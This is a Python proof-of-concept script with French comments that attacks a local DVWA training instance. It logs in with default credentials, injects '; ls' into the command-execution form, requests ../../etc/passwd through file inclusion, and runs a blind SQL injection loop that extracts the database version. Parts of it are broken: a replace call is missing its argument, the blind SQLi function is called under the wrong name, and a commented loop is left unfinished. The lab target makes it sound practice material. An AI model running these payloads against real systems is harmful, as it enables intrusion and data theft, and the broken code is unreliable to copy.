import requests
from bs4 import BeautifulSoup
import re
import urllib.request

# login to DVWA
login_url = 'http://172.17.0.1/login.php'
username = 'admin'
password = 'password'

# Create session
session = requests.Session()

# Get Token
response = session.get(login_url)
token = re.findall("user_token'\s*value='(.*?)'", response.text)[0]

# Login to DVWA
response = session.post(login_url, data={
    'username': username,
    'password': password,
    'user_token': token,
    'Login': 'Login'
})

# Get HTML
url = 'http://172.17.0.1/'
response = session.get(url)

# Parse HTML & Find Links
soup = BeautifulSoup(response.content, "html.parser")
links = soup.find_all("a")

# Add url to List
url_list = []
for link in links:
    url_list.append('/' + link.get("href"))

# Imprimer la liste des URLs
print(url_list)


# ========================== PoC ========================== 

# ======== Command Injection cases ========

urlD = 'http://172.17.0.1/vulnerabilities/exec/'

response = session.get(urlD)

soup = BeautifulSoup(response.text, 'html.parser')

# Find Form on the page
forms = soup.find_all('form')

commandInjection = '; ls'

for form in forms:
    inputs = form.find_all('input')
    for input in inputs:
        if input.get('type') == 'text':
            # Submit form
            form_data = {}
            for form_input in form.find_all('input'):
                form_data[form_input.get('name')] = form_input.get('value')
                if form_input.get('type') == 'text':
                    form_data[form_input.get('name')] = commandInjection
                    response = session.post('http://172.17.0.1/vulnerabilities/exec/' + form.get('action'), data=form_data)
                    print("====================>\n" + response.text)
                    if response.text.find("www-data") != -1:
                        print("La commande a été exécutée avec succès")
                        print(response.text)
                    else:
                        print("La commande n'a pas été exécutée correctement")
                    break
                if form_input.get('type') == 'submit':
                    form_data[form_input.get('name')] = form_input.get('value')
            break
        break


# ======== File Inclusion cases ========


url_File_inclusion = "http://127.0.0.1/vulnerabilities/fi/?page=include.php"

basic_payload_file_inclusion_prompt = input("Perform basic LFI attack ?: [y] - [n]")
basic_payload_file_inclusion = "../../../../../../../../../../etc/passwd"
if basic_payload_file_inclusion_prompt == 'y':
    new_url_new_url_File_inclusion_II = url.replace("include.php",)
    response = session.post(url_File_inclusion + basic_payload_file_inclusion)
    print(response.text)
else:
    print("fail file inclusion")

# basic_payload_file_inclusion = "../"
# for i in range(1,7):
#     data=basic_payload_file_inclusion*i+file_name
#     req = session.post(




# ======== BLind SQLI ========
# Security : Medium (mais go changer pour Low)

def blind_sqli(base, cookies, ok):
    print("--Blind SQLi on progress--")
    colonne_dbonne = 1
    data_v = ""
    itr = list(range(32,127))
    while True:
        found = False
        for nmbr in itr:
            #payload
            url = base + "?id=-1+union+select+null%2CASCII%28substring%28%40%40version%2C" + str(colonne_dbonne) + \
                  "%2C1%29%29%3D" + str(nmbr) + "%23&Submit=Submit#"
            try:
                response = requests.get(url, headers={'Cookie': cookies}, timeout=5).text
            except:
                pass
            if ok in response:
                data_v = data_v + chr(nmbr)
                found = True
                break
        colonne_dbonne = colonne_dbonne + 1
        if not found:
            break
    return data_v

OK_SRCH = "name: 1"
# HIchem faut que tu mexplique comment tu geres les cookies avec session.get(url)
cookies = "security=medium; PHPSESSID=xxx"
# Change your IP
url_base = "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
print("Version: " + blind_sql(url_base, cookies, OK_SRCH))
